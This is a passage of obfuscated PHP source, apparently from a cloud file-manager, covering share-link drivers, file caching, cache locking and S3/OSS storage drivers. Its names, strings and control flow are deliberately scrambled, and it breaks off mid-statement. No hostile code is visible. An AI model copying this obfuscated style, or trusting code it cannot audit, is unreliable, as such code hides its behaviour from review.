$d›ÍÒØ¿„ ); if ($bÍ¬Ú²ßµ == $dàéãĞÎÜé[9]) { $d›ÍÒØ¿„  = stripslashes($d›ÍÒØ¿„ ); } return $d›ÍÒØ¿„ ; } } goto CÜ†Ğ¥íÕ; bò©‡ò³³å: class PathDriverDbShareLink extends PathDriverDB { public function __construct($AÇóÚ†¥’) { $this->pathParse = $AÇóÚ†¥’; $this->model = Model($_SERVER[¶ªÕß‚ØÁŸ][1121]); } protected function infoParse($FĞ„ñ‡Ø ¸, $bÙŒÍ„ÁŒì = false, $B‹¶Û©ÏÑê = false) { $CÎÍÄîÛÅ¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; return Action($CÎÍÄîÛÅ¤[1021])->sharePathInfo($this->pathParse[$CÎÍÄîÛÅ¤[85]], !0); } public function listPath($bŒ•ÂÆ’©±, $CÂÑ¢–§•Õ = false) { $c¤ÍÀºˆ¶á =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¼ßµ´“–Ò = parent::listPath($bŒ•ÂÆ’©±, $CÂÑ¢–§•Õ); foreach ($f¼ßµ´“–Ò as $A¯’Å×İ®Ğ => $fæ¤ØŒ¤œÉ) { if (!in_array($A¯’Å×İ®Ğ, array($c¤ÍÀºˆ¶á[83], $c¤ÍÀºˆ¶á[84]))) { continue; } foreach ($fæ¤ØŒ¤œÉ as $c…ßÓ•‚à => $b³·î‚Ó²ï) { $f¼ßµ´“–Ò[$A¯’Å×İ®Ğ][$c…ßÓ•‚à] = Action($c¤ÍÀºˆ¶á[1021])->shareItemInfo($b³·î‚Ó²ï); } } return $f¼ßµ´“–Ò; } public function listAll($F«„Ò»¶˜õ) { $F¿åËí²àİ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D¦„ªŸœÒ = IO::info($this->pathParse[$F¿åËí²àİ[85]]); if (!$D¦„ªŸœÒ) { return array(); } $BŠä¢–´‡† = $this->model->listAll($F«„Ò»¶˜õ); foreach ($BŠä¢–´‡† as &$E±‚ªñ™) { $E±‚ªñ™[$F¿åËí²àİ[399]] = Action($F¿åËí²àİ[1021])->shareItemInfo($E±‚ªñ™[$F¿åËí²àİ[399]]); } return $BŠä¢–´‡†; } } class PathDriverDriverShareItem { public function __construct($BÍ”­§£†Á) { $this->pathParse = $BÍ”­§£†Á; } public function __call($cãÖÄÌ©¯º, $F‡âæ†çÆŸ) { $F˜–ó‚­Éé =& $_SERVER[¶ªÕß‚ØÁŸ]; if (method_exists($this, $cãÖÄÌ©¯º)) { return; } $CÑó¼‚¿‹’ = call_user_func_array(array($F˜–ó‚­Éé[1128], $cãÖÄÌ©¯º), $F‡âæ†çÆŸ); $bêÚÃ¿”éŠ = array($F˜–ó‚­Éé[1129], $F˜–ó‚­Éé[1130], $F˜–ó‚­Éé[1131], $F˜–ó‚­Éé[1132], $F˜–ó‚­Éé[498], $F˜–ó‚­Éé[500], $F˜–ó‚­Éé[1133], $F˜–ó‚­Éé[113], $F˜–ó‚­Éé[1134], $F˜–ó‚­Éé[1135]); if (in_array($cãÖÄÌ©¯º, $bêÚÃ¿”éŠ)) { $CÑó¼‚¿‹’ = $this->getPathOuter($CÑó¼‚¿‹’); } return $CÑó¼‚¿‹’; } public function copy($AÖ”ÌÚ , $BÒÍÑÁ´àĞ, $C‰Ç¶Ââ±‘ = false) { return $this->copyMove($AÖ”ÌÚ , $BÒÍÑÁ´àĞ, $C‰Ç¶Ââ±‘, $_SERVER[¶ªÕß‚ØÁŸ][498]); } public function move($EÈŸ£·ñ‘, $b·Œ¥ª·´Ç, $e½ÇŞš®É› = false) { return $this->copyMove($EÈŸ£·ñ‘, $b·Œ¥ª·´Ç, $e½ÇŞš®É›, $_SERVER[¶ªÕß‚ØÁŸ][500]); } private function copyMove($B¹”°ˆÒ•ä, $bğäèØ¹å‡, $c½ÊÃ¸“Ú, $c’ñ…Ç½İ) { goto Bñ›¨ŸÉÍ¯; f–¹ÜÕ»¸‹: return $Fì—«ìä; goto C‘ŠÙŠƒ•÷; Bñ›¨ŸÉÍ¯: $E§µÅ¯½±‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $CŞËµÇ›“  = $bğäèØ¹å‡; $fç»ç  ñÈ = IO::driverMake($bğäèØ¹å‡); goto aèï§ˆä³ò; aèï§ˆä³ò: if ($fç»ç  ñÈ->pathParse[$E§µÅ¯½±‚[1002]]) { $bğäèØ¹å‡ = $fç»ç  ñÈ->pathParse[$E§µÅ¯½±‚[1002]]; } else { $bğäèØ¹å‡ = $CŞËµÇ›“ ; } $Fì—«ìä = IO::copyMove($B¹”°ˆÒ•ä, $bğäèØ¹å‡, $c½ÊÃ¸“Ú, $c’ñ…Ç½İ); $Fì—«ìä = $this->getPathOuter($Fì—«ìä); goto f–¹ÜÕ»¸‹; C‘ŠÙŠƒ•÷: } public function pathFather($cô˜œ‘…‘) { return get_path_father($this->pathParse[$_SERVER[¶ªÕß‚ØÁŸ][85]]); } public function iconvSystem($D„›Äó¢éâ) { return $D„›Äó¢éâ; } protected function infoParse($AŞæÇÓŠÎç, $a‘‹­À¸½ = false) { $E‘¨Ç¶„ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $B­ã¨ëß¤Ó = $this->pathParse[$E‘¨Ç¶„ê[447]][$E‘¨Ç¶„ê[1022]] . $this->pathParse[$E‘¨Ç¶„ê[1015]]; if ($a‘‹­À¸½) { $aîì˜èêö = IO::infoWithChildren($B­ã¨ëß¤Ó); } else { $aîì˜èêö = IO::info($B­ã¨ëß¤Ó); } $A…§ğ»Ù™î = $this->pathParse[$E‘¨Ç¶„ê[447]]; return Action($E‘¨Ç¶„ê[1127])->_shareItemeParse($aîì˜èêö, $A…§ğ»Ù™î); } public function listAll($BÑÓÊÜË‘è) { $D‡Ş°’– =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÆÇ”‰ã§‹ = IO::listAll($BÑÓÊÜË‘è); $eŒÔíæ·ÒÈ = $this->pathParse[$D‡Ş°’–[447]]; foreach ($fÆÇ”‰ã§‹ as &$A½­ß…µÓÚ) { check_abort(); $A½­ß…µÓÚ = array_merge(IO::info($A½­ß…µÓÚ[$D‡Ş°’–[85]]), $A½­ß…µÓÚ); $A½­ß…µÓÚ[$D‡Ş°’–[399]] = Action($D‡Ş°’–[1127])->_shareItemeParse($A½­ß…µÓÚ, $eŒÔíæ·ÒÈ); } return $fÆÇ”‰ã§‹; } public function getPathOuter($Bˆ¾–‹ Í›) { goto fÏÁ“ÒÒ„Ñ; fÏÁ“ÒÒ„Ñ: $cêÂ£ïÚĞ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EŒÙï½î»  = KodIO::parse($Bˆ¾–‹ Í›); if ($EŒÙï½î» [$cêÂ£ïÚĞ‘[29]] == KodIO::KOD_SHARE_ITEM) { return $EŒÙï½î» [$cêÂ£ïÚĞ‘[85]]; } goto C—…¡½¯”; AÄÕËã“‚ö: if (substr($CàíÖê…Ô, 0, strlen($Eï’Üã¾ğ…)) != $Eï’Üã¾ğ…) { return !1; } return $this->pathParse[$cêÂ£ïÚĞ‘[1016]] . $cêÂ£ïÚĞ‘[8] . ltrim($dêÊƒ È¹‹, $cêÂ£ïÚĞ‘[8]); goto E›ëÜÓ´Ä; C—…¡½¯”: $CàíÖê…Ô = KodIO::clear($Bˆ¾–‹ Í›); $Eï’Üã¾ğ… = KodIO::clear($this->pathParse[$cêÂ£ïÚĞ‘[447]][$cêÂ£ïÚĞ‘[1022]]); $dêÊƒ È¹‹ = substr($CàíÖê…Ô, strlen($Eï’Üã¾ğ…)); goto AÄÕËã“‚ö; E›ëÜÓ´Ä: } public function getType() { $Aíé×œƒ‘¿ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e¿˜ç¹‹¶Š = str_replace($Aíé×œƒ‘¿[81], $Aíé×œƒ‘¿[33], get_class($this)); return strtolower($e¿˜ç¹‹¶Š); } public function isTypeObject($A˜„º’Ñç) { return IO::isTypeObject($A˜„º’Ñç); } public function info($d¦ë˜×ò‰œ) { return $this->infoParse($d¦ë˜×ò‰œ); } public function infoAuth($D¯Õ„ï½Ö¬) { return $this->infoParse($D¯Õ„ï½Ö¬); } public function infoWithChildren($fƒÜ¾É–²) { return $this->infoParse($fƒÜ¾É–², !0); } public function infoFull($B®ŒÛ’‹°) { return $this->infoParse($B®ŒÛ’‹°); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($A§Ğì—¤ë©) { $this->pathParse = $A§Ğì—¤ë©; } protected function infoParse($F˜¯ƒëì¿¸, $AòšÑğ…èó = false) { $d˜±™°…¸ç =& $_SERVER[¶ªÕß‚ØÁŸ]; return Action($d˜±™°…¸ç[1021])->sharePathInfo($this->pathParse[$d˜±™°…¸ç[85]], !0, $AòšÑğ…èó); } public function listPath($FÙ²—Èø¹, $F•ŞËãÁèµ = false) { $dËğˆ„¦’„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E©¨™÷„‡ = IO::listPath($FÙ²—Èø¹, $F•ŞËãÁèµ); foreach ($E©¨™÷„‡ as $cÍ®ºã‚±´ => $B·ÖŠ…ø·Ë) { if (!in_array($cÍ®ºã‚±´, array($dËğˆ„¦’„[83], $dËğˆ„¦’„[84]))) { continue; } foreach ($B·ÖŠ…ø·Ë as $CÕ†Ã¬Ò§³ => $c‰´”«“›„) { $c‰´”«“›„ = Action($dËğˆ„¦’„[1136])->parsePathChildren($c‰´”«“›„, array($dËğˆ„¦’„[395] => $FÙ²—Èø¹)); $E©¨™÷„‡[$cÍ®ºã‚±´][$CÕ†Ã¬Ò§³] = Action($dËğˆ„¦’„[1021])->shareItemInfo($c‰´”«“›„); } } return $E©¨™÷„‡; } public function listAll($FåÊ×ìÙÜ˜) { $fƒÚ¤Û×– =& $_SERVER[¶ªÕß‚ØÁŸ]; $e†ñêï…Ş = IO::listAll($FåÊ×ìÙÜ˜); foreach ($e†ñêï…Ş as &$A‚™¹˜»ÂÀ) { $A‚™¹˜»ÂÀ = array_merge(IO::info($A‚™¹˜»ÂÀ[$fƒÚ¤Û×–[85]]), $A‚™¹˜»ÂÀ); $A‚™¹˜»ÂÀ[$fƒÚ¤Û×–[399]] = Action($fƒÚ¤Û×–[1021])->shareItemInfo($A‚™¹˜»ÂÀ); } return $e†ñêï…Ş; } } goto cšÙõ±ª”µ; E¯Î×ÉÑ•¯: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($BÄƒ²–«, $E¾¯†ÅÜÍˆ) { $CïÂ¾£Œªï =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->cachePath = $BÄƒ²–«[$CïÂ¾£Œªï[85]]; $this->prefix = $CïÂ¾£Œªï[774]; $this->cacheTime = $E¾¯†ÅÜÍˆ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($aÁ£Úº†¶») { $AÏ­ÆÈõ‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÁ£Úº†¶» = str_replace(array($AÏ­ÆÈõ‹[775], $AÏ­ÆÈõ‹[103], $AÏ­ÆÈõ‹[79]), $AÏ­ÆÈõ‹[776], $aÁ£Úº†¶»); return $this->cachePath . $AÏ­ÆÈõ‹[777] . $aÁ£Úº†¶» . $AÏ­ÆÈõ‹[778]; } public function set($eƒåÊÓÚÏ‰, $eñ‰ëòêİ´, $A×ĞÖÉô¢ = false) { $fÍì…˜³¸„ = $this->getFile($eƒåÊÓÚÏ‰); if (file_put_contents($fÍì…˜³¸„, $this->prefix . $eñ‰ëòêİ´, LOCK_EX)) { return !0; } @unlink($fÍì…˜³¸„); return !1; } public function get($cİßíÜĞå) { $dÙ¸ÏÄÄæ = $this->getFile($cİßíÜĞå); if (file_exists($dÙ¸ÏÄÄæ) && filemtime($dÙ¸ÏÄÄæ) < time() - $this->cacheTime) { @unlink($dÙ¸ÏÄÄæ); return !1; } $d½‡´‚‡Â = @file_get_contents($dÙ¸ÏÄÄæ); return substr($d½‡´‚‡Â, strlen($this->prefix)); } public function remove($D‡ËÔ÷ÑÊÁ) { $eğ˜Ş¢®ÛÉ = $this->getFile($D‡ËÔ÷ÑÊÁ); return @unlink($eğ˜Ş¢®ÛÉ); } public function deleteAll() { $eàŠÀÖ¹¬ù =& $_SERVER[¶ªÕß‚ØÁŸ]; $bôŠÊìŒâ = scandir($this->cachePath); foreach ($bôŠÊìŒâ as $a¼¿›½æŠ¸) { $e†Œ£˜¹îÖ = $this->cachePath . $a¼¿›½æŠ¸; if (strpos($e†Œ£˜¹îÖ, $eàŠÀÖ¹¬ù[778]) && strpos($e†Œ£˜¹îÖ, $eàŠÀÖ¹¬ù[779])) { @unlink($e†Œ£˜¹îÖ); } } } public function clearTimeout() { $DÌÖ‘™¯æ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cèïöìİ‰‚ = scandir($this->cachePath); foreach ($Cèïöìİ‰‚ as $Bß£ˆ¹µ—İ) { $D¡ŠÙï¢é¡ = $this->cachePath . $Bß£ˆ¹µ—İ; if (strpos($D¡ŠÙï¢é¡, $DÌÖ‘™¯æ[778]) && strpos($D¡ŠÙï¢é¡, $DÌÖ‘™¯æ[779]) && filemtime($D¡ŠÙï¢é¡) < time() - $this->cacheTime) { @unlink($D¡ŠÙï¢é¡); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto e¤öØÀø´™; e¤öØÀø´™: $F¿Ûñì¤÷Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; if (self::$handle) { return self::$handle; } $b½ïçÏó = $GLOBALS[$F¿Ûñì¤÷Ê[6]][$F¿Ûñì¤÷Ê[346]]; goto bô¶¦Ô‚¦›; bô¶¦Ô‚¦›: self::$timeout = $b½ïçÏó[$F¿Ûñì¤÷Ê[780]] ? $b½ïçÏó[$F¿Ûñì¤÷Ê[780]] : 10; $A±ŞëÄëÚ‚ = _get($GLOBALS[$F¿Ûñì¤÷Ê[6]], $F¿Ûñì¤÷Ê[781]); $eöØÇáÁÕÛ = $b½ïçÏó[$F¿Ûñì¤÷Ê[767]] ? $b½ïçÏó[$F¿Ûñì¤÷Ê[767]] : $F¿Ûñì¤÷Ê[177]; goto céëÈŠÀğã; céëÈŠÀğã: if ($eöØÇáÁÕÛ == $F¿Ûñì¤÷Ê[17] && $A±ŞëÄëÚ‚ == $F¿Ûñì¤÷Ê[9]) { $eöØÇáÁÕÛ = $F¿Ûñì¤÷Ê[177]; } switch ($eöØÇáÁÕÛ) { case $F¿Ûñì¤÷Ê[770]: self::$handle = new CacheLockRedis(); break; case $F¿Ûñì¤÷Ê[771]: self::$handle = new CacheLockMemcached(); break; case $F¿Ûñì¤÷Ê[17]: self::$handle = new CacheLockDatabase(); break; case $F¿Ûñì¤÷Ê[177]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fµíÍõ‹’; fµíÍõ‹’: } private static function key($aÃßßè¡™…) { return $_SERVER[¶ªÕß‚ØÁŸ][782] . Cache::key($aÃßßè¡™…); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($bš•æíÈÍ­ = '') { self::$errorMsg = $bš•æíÈÍ­; } public static function lockGlobal($D‚Ø¹ÙŸè, $Dâ‘Œîî‚) { return self::lock($D‚Ø¹ÙŸè, $Dâ‘Œîî‚, !0); } public static function lock($B¢Ö¬ìùé, $F­Ãƒ¸‘Ú· = false, $Bæ­¶ëå±á = false) { goto f•ğºÅŠÁ‹; f•ğºÅŠÁ‹: $CÑ‚ˆö³³¶ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f×‹Á’Ã = self::init(); $BÖœ¶ŞÎÑ = self::key($B¢Ö¬ìùé); goto e¤‹’’³…œ; e¤‹’’³…œ: $F­Ãƒ¸‘Ú· = $F­Ãƒ¸‘Ú· ? $F­Ãƒ¸‘Ú· : self::$timeout; $bˆÚ’öö¤Å = $f×‹Á’Ã->lock($BÖœ¶ŞÎÑ, $F­Ãƒ¸‘Ú·); if (!$bˆÚ’öö¤Å) { $E¾ØÖÆ¢ù = $CÑ‚ˆö³³¶[783] . $F­Ãƒ¸‘Ú· . $CÑ‚ˆö³³¶[77] . self::$errorMsg . $CÑ‚ˆö³³¶[77] . get_caller_msg(); $AÕ¦çó¨¬ = "\x4c\x6f\x63\x6b\x20\141\143\x74\151\157\156\x3a\x20{$BÖœ¶ŞÎÑ}\x20\x74\151\155\145\157\165\x74\54\157\166\x65\x72\x20{$F­Ãƒ¸‘Ú·}\x20\x73"; $AÕ¦çó¨¬ = self::$errorMsg ? self::$errorMsg : $AÏöÈƒÌ©Ø; write_log($E¾ØÖÆ¢ù, $CÑ‚ˆö³³¶[784]); show_json($AÕ¦çó¨¬, !1); } goto f¦ÒÓ×Š½; f¦ÒÓ×Š½: if (!$Bæ­¶ëå±á) { self::$lockItem[$BÖœ¶ŞÎÑ] = !0; } return $bˆÚ’öö¤Å; goto C¥¶†„»œ; C¥¶†„»œ: } public static function lockGet($BáÕ®º‰Ë¼) { $e¢İ„¹‰™˜ = self::key($BáÕ®º‰Ë¼); if (self::$lockItem[$e¢İ„¹‰™˜]) { return self::$lockItem[$e¢İ„¹‰™˜]; } return self::init()->lockGet($e¢İ„¹‰™˜); } public static function unlock($aİŒÆÉ©²Ÿ) { $b“ß˜±£êõ = self::key($aİŒÆÉ©²Ÿ); self::$lockItem[$b“ß˜±£êõ] = null; return self::init()->unlock($b“ß˜±£êõ); } public static function unlockRuntime() { $a¥ˆƒ¸œ£÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c’İŞ£ÏÍæ = self::init(); $B¸ÄÀŞÆÍÂ = !1; foreach (self::$lockItem as $aÏá´Ò‹‘Á => $E‘„÷ºœÉ°) { if (!$E‘„÷ºœÉ°) { continue; } $c’İŞ£ÏÍæ->unlock($aÏá´Ò‹‘Á); if (!$B¸ÄÀŞÆÍÂ) { $B¸ÄÀŞÆÍÂ = !0; write_log($a¥ˆƒ¸œ£÷[785] . $aÏá´Ò‹‘Á . $a¥ˆƒ¸œ£÷[77] . get_caller_msg(), $a¥ˆƒ¸œ£÷[784]); continue; } write_log($a¥ˆƒ¸œ£÷[785] . $aÏá´Ò‹‘Á, $a¥ˆƒ¸œ£÷[784]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto fÎ·Áô„Ú¹; F…÷´äÖÄ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($EŠ“ñÈá’ø) { parent::__construct($EŠ“ñÈá’ø); $this->signatureVersion($_SERVER[¶ªÕß‚ØÁŸ][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D¬Û³ŒÒ®Ó) { parent::__construct($D¬Û³ŒÒ®Ó); $this->signatureVersion($_SERVER[¶ªÕß‚ØÁŸ][210]); } public function fileOutLink($e‡àÆÓ¤ĞÂ) { $d£İè«Ì³ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (substr($e‡àÆÓ¤ĞÂ, 0, 7) == $d£İè«Ì³[1119]) { $e‡àÆÓ¤ĞÂ = $d£İè«Ì³[1120] . substr($e‡àÆÓ¤ĞÂ, 7); } header($d£İè«Ì³[166] . $e‡àÆÓ¤ĞÂ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($d“‹š›ÜùÜ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¶ªÕß‚ØÁŸ][1174]; $this->_init($d“‹š›ÜùÜ); } public function _init($BÚÌî®Ï£„) { foreach ($BÚÌî®Ï£„ as $f‰ÍËäÍÊõ => $CÆÓ—ùí½) { if (isset($this->{$f‰ÍËäÍÊõ})) { $this->{$f‰ÍËäÍÊõ} = $CÆÓ—ùí½; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¶ªÕß‚ØÁŸ][1175], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto DÀè¾ŸÄÇ“; EˆŠ“Ã©³Ğ: $A„¥°ä¬Íã->addRule($AÑÌˆ‘Ï‚§); try { $this->client->putBucketCors($this->bucket, $A„¥°ä¬Íã); } catch (OSS\Core\OssException $Fäç…ˆº) { return !1; } return !0; goto AÌÛŞÃ‡ƒÊ; CÛİİŞ˜‡: $AÑÌˆ‘Ï‚§->addAllowedOrigin($F‡§£±Á£µ[1176]); $AÑÌˆ‘Ï‚§->addAllowedMethod($F‡§£±Á£µ[1177]); $AÑÌˆ‘Ï‚§->addAllowedMethod($F‡§£±Á£µ[1178]); goto cŸ¨‘—Ú®; cŸ¨‘—Ú®: $AÑÌˆ‘Ï‚§->addAllowedMethod($F‡§£±Á£µ[1179]); $AÑÌˆ‘Ï‚§->addAllowedMethod($F‡§£±Á£µ[1180]); $AÑÌˆ‘Ï‚§->addAllowedMethod($F‡§£±Á£µ[165]); goto eÈßÄ®àîÛ; DÀè¾ŸÄÇ“: $F‡§£±Á£µ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A„¥°ä¬Íã = new OSS\Model\CorsConfig(); $AÑÌˆ‘Ï‚§ = new OSS\Model\CorsRule(); goto CÛİİŞ˜‡; eÈßÄ®àîÛ: $AÑÌˆ‘Ï‚§->setMaxAgeSeconds(600); $AÑÌˆ‘Ï‚§->addExposeHeader($F‡§£±Á£µ[1181]); $AÑÌˆ‘Ï‚§->addAllowedHeader($F‡§£±Á£µ[1176]); goto EˆŠ“Ã©³Ğ; AÌÛŞÃ‡ƒÊ: } public function getBucketCors() { goto AéÚ¯ÒíÙ‡; Eç®…³È¡¥: $eõ”Å¦¦ = $b²ùùùŞË‘[0]->getMaxAgeSeconds(); $E×ñ«Ãîî = $b²ùùùŞË‘[0]->getExposeHeaders(); $A¾ä°Õ¯ª = $b²ùùùŞË‘[0]->getAllowedHeaders(); goto Fºà­òİ„; D•—òÑÇ±‰: if (!$FĞÊöøšÇĞ || !($b²ùùùŞË‘ = $FĞÊöøšÇĞ->getRules())) { return null; } $B¼¸Ù¬ŒªÎ = $b²ùùùŞË‘[0]->getAllowedOrigins(); $DìËÏ°Ê¬œ = $b²ùùùŞË‘[0]->getAllowedMethods(); goto Eç®…³È¡¥; Fºà­òİ„: return array($Aƒà…Ç±Ü[185] => isset($B¼¸Ù¬ŒªÎ[0]) ? $B¼¸Ù¬ŒªÎ[0] : $Aƒà…Ç±Ü[33], $Aƒà…Ç±Ü[189] => $DìËÏ°Ê¬œ, $Aƒà…Ç±Ü[1182] => $eõ”Å¦¦, $Aƒà…Ç±Ü[1183] => isset($E×ñ«Ãîî[0]) ? $E×ñ«Ãîî[0] : $Aƒà…Ç±Ü[33], $Aƒà…Ç±Ü[187] => isset($A¾ä°Õ¯ª[0]) ? $A¾ä°Õ¯ª[0] : $Aƒà…Ç±Ü[33]); goto B£ïÒ¡„ŞŞ; AéÚ¯ÒíÙ‡: $Aƒà…Ç±Ü =& $_SERVER[¶ªÕß‚ØÁŸ]; $FĞÊöøšÇĞ = null; try { $FĞÊöøšÇĞ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $d±§ğˆå°¢) { return null; } goto D•—òÑÇ±‰; B£ïÒ¡„ŞŞ: } public function isBucketCors() { goto B½Â˜×³ßª; E²ƒ›¡È: if ($C¢¡éá÷êÔ[$cæî³†…ò¨[185]] != $cæî³†…ò¨[186] || $C¢¡éá÷êÔ[$cæî³†…ò¨[187]] != $cæî³†…ò¨[186]) { return !1; } $fÈğ‘«Å· = array_map($cæî³†…ò¨[188], $C¢¡éá÷êÔ[$cæî³†…ò¨[189]]); if (!is_array($fÈğ‘«Å·)) { $fÈğ‘«Å· = array(); } goto eœ–ãš‡çÑ; eœ–ãš‡çÑ: $bÚ’÷¬”…Œ = array($cæî³†…ò¨[190], $cæî³†…ò¨[191], $cæî³†…ò¨[192], $cæî³†…ò¨[193], $cæî³†…ò¨[194]); $fˆóéÉ¨ô = array_diff($bÚ’÷¬”…Œ, $fÈğ‘«Å·); return empty($fˆóéÉ¨ô); goto aŒ±äÌËï‘; B½Â˜×³ßª: $cæî³†…ò¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¢¡éá÷êÔ = $this->getBucketCors(); if (!$C¢¡éá÷êÔ || !is_array($C¢¡éá÷êÔ)) { return !1; } goto E²ƒ›¡È; aŒ±äÌËï‘: } public function mkfile($aôøĞÑçä, $D½¤¦îÌÏ˜ = '', $cÁàÃ²£ƒ‹ = REPEAT_RENAME) { $CçîÑœ‘‚º = $this->setContent($aôøĞÑçä, $D½¤¦îÌÏ˜); if ($CçîÑœ‘‚º !== !1) { return $this->getPathOuter($aôøĞÑçä); } return !1; } public function mkdir($cùóÏ„•‹…, $E¡Æº„ÅØÌ = REPEAT_SKIP) { if ($this->_isFolder($cùóÏ„•‹…)) { return $this->getPathOuter($cùóÏ„•‹…); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cùóÏ„•‹…)); } catch (OSS\Core\OssException $EÕÂß”èÁ) { return !1; } return $this->getPathOuter($cùóÏ„•‹…); } private function fileList($A²Ğâ˜ÏŞó, $F¤Ü£˜™Úò = '', $bÇñ‚Ş¦¥ = 0) { goto DïÀ—ãª–; DïÀ—ãª–: $F‘ÃäãŠÓÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A²Ğâ˜ÏŞó = trim($A²Ğâ˜ÏŞó, $F‘ÃäãŠÓÕ[8]); $b­î¾…Ò´ = empty($A²Ğâ˜ÏŞó) ? $F‘ÃäãŠÓÕ[33] : $A²Ğâ˜ÏŞó . $F‘ÃäãŠÓÕ[8]; goto eö êù¥êë; eö êù¥êë: $DÓÈ¢ªÅ‘ = $F‘ÃäãŠÓÕ[33]; $dÄë¤Ö¨ = 1000; $Eéá¤¿¬î¹ = $BÔññÃé™• = array(); goto c¤ÅÁğá¼Ğ; c¤ÅÁğá¼Ğ: while (!0) { $d±‰º°ïß‚ = array($F‘ÃäãŠÓÕ[1184] => $F¤Ü£˜™Úò, $F‘ÃäãŠÓÕ[196] => $b­î¾…Ò´, $F‘ÃäãŠÓÕ[1185] => $dÄë¤Ö¨, $F‘ÃäãŠÓÕ[1186] => $DÓÈ¢ªÅ‘); try { $D«§’Ö¨…ö = $this->client->listObjects($this->bucket, $d±‰º°ïß‚); } catch (OSS\Core\OssException $fÉ£Êßñ) { break; } $DÓÈ¢ªÅ‘ = $D«§’Ö¨…ö->getNextMarker(); $d›ãòˆÂßá = $D«§’Ö¨…ö->getObjectList(); $e¦¸ÆÌŒ¼ = $D«§’Ö¨…ö->getPrefixList(); foreach ($d›ãòˆÂßá as $Dƒ•Ì—­Í’) { if ($Dƒ•Ì—­Í’->getKey() == $b­î¾…Ò´) { continue; } $Aãİ­Ø¢î = $Dƒ•Ì—­Í’->getKey(); if ($bÇñ‚Ş¦¥) { $Aãİ­Ø¢î = array($F‘ÃäãŠÓÕ[28] => $Aãİ­Ø¢î, $F‘ÃäãŠÓÕ[87] => $Dƒ•Ì—­Í’->getSize(), $F‘ÃäãŠÓÕ[200] => strtotime($Dƒ•Ì—­Í’->getLastModified())); } $BÔññÃé™•[] = $Aãİ­Ø¢î; } foreach ($e¦¸ÆÌŒ¼ as $bÃ»¨Úñ˜‚) { $Eéá¤¿¬î¹[] = $bÃ»¨Úñ˜‚->getPrefix(); } if ($DÓÈ¢ªÅ‘ === $F‘ÃäãŠÓÕ[33]) { break; } } return array($F‘ÃäãŠÓÕ[84] => $Eéá¤¿¬î¹, $F‘ÃäãŠÓÕ[83] => $BÔññÃé™•); goto b¶‘ÄŒô®; b¶‘ÄŒô®: } public function copyFile($b¿ì­íóêï, $aÀæ™öÍÚ) { $aÈŠÅƒæÉ = $this->size($b¿ì­íóêï); if ($aÈŠÅƒæÉ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $b¿ì­íóêï, $this->bucket, $this->pathEncode($aÀæ™öÍÚ)); } catch (OSS\Core\OssException $d…Á¿š¿ƒ™) { return !1; } return !0; } return $this->multiCopyObject($b¿ì­íóêï, $aÀæ™öÍÚ, $aÈŠÅƒæÉ); } private function multiCopyObject($cÑæàÔÎÂ‰, $BïáéÃ©ëì, $B¦¦½Æ–Á) { $E»‹øîø™” =& $_SERVER[¶ªÕß‚ØÁŸ]; try { goto a¿ºÔÔßÃÆ; b…¶ÒË‹´: $fÅÈ†À®‡ã = array(); foreach ($E½¬·´§¾´ as $Bñ—Áø¶°ì => $E´İÎøƒÂ’) { $fÅÈ†À®‡ã[] = array($E»‹øîø™”[1191] => $Bñ—Áø¶°ì + 1, $E»‹øîø™”[1192] => $E´İÎøƒÂ’); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($BïáéÃ©ëì), $aÄì…¬Šåˆ, $fÅÈ†À®‡ã); goto döÀ„¡àƒ®; C½‡£Íší¤: $A”èøßìµ• = 1024 * 1024 * 10; $EÛğğŸ¸Ó´ = $this->client->generateMultiuploadParts($B¦¦½Æ–Á, $A”èøßìµ•); foreach ($EÛğğŸ¸Ó´ as $Bñ—Áø¶°ì => $dÂ×·Ú±ø) { $fŒİ¥à¹ = $cˆÁÀ± + (int) $dÂ×·Ú±ø[$E»‹øîø™”[1188]]; $bƒã¾á¤© = (int) $dÂ×·Ú±ø[$E»‹øîø™”[334]] + $fŒİ¥à¹ - 1; $bÕæ¶ß‡« = array($E»‹øîø™”[1189] => $fŒİ¥à¹, $E»‹øîø™”[1190] => $bƒã¾á¤©); $E½¬·´§¾´[] = 